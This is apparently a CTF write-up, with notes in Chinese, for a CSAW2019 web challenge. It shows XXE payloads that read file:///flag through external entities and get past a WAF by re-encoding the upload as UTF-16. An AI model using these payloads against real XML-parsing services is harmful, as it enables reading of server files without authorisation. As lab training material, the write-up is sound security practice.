![[Pasted image 20230215154426.png|500]]

```
/index.php
```

![[Pasted image 20230215154507.png|500]]

```
/user.php
```

![[Pasted image 20230215154544.png|500]]

```
/upload.php
```

![[Pasted image 20230215154614.png|500]]

```
/sample.xml
```

```xml
<?xml version='1.0'?>
<users>
    <user>
        <username>alice</username>
        <password>passwd1</password>
        <name>Alice</name>
        <email>alice@fakesite.com</email>  
        <group>CSAW2019</group>
    </user>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name> Bob</name>
        <email>bob@fakesite.com</email>  
        <group>CSAW2019</group>
    </user>
</users>
```

```
/about.php
```

![[Pasted image 20230215154632.png|500]]

尝试进行XXE

```xml
<?xml version='1.0'?>
<!DOCTYPE xxe [
	<!ENTITY flag SYSTEM "file:///flag">
]>
<users>
    <user>
        <username>sad</username>
        <password>114514</password>
        <name>CrackTC</name>
        <email>123@baidu.com</email>  
        <group>&flag;</group>
    </user>
</users>
```

![[Pasted image 20230215170047.png|500]]

遭到了WAF的拦截

转换文件编码为`utf16`后成功绕过

![[Pasted image 20230215171839.png|500]]

`group`属性貌似会被截断，干脆全改上

```xml
<?xml version='1.0'?>
<!DOCTYPE xxe [
	<!ENTITY flag SYSTEM "file:///flag">
]>
<users>
    <user>
        <username>&flag;</username>
        <password>&flag;</password>
        <name>&flag;</name>
        <email>&flag;</email>  
        <group>&flag;</group>
    </user>
</users>
```

![[Pasted image 20230215172853.png|500]]

然鹅都被截断了qaq

最后发现原来还有个`intro`没写在sample里

```xml
<?xml version='1.0'?>
<!DOCTYPE xxe [
	<!ENTITY flag SYSTEM "file:///flag">
]>
<users>
    <user>
        <username>&flag;</username>
        <password>&flag;</password>
        <name>&flag;</name>
        <email>&flag;</email>
        <group>&flag;</group>
        <intro>&flag;</intro>
    </user>
</users>
```

![[Pasted image 20230215173018.png|500]]

#Web #XXE #encoding #bypass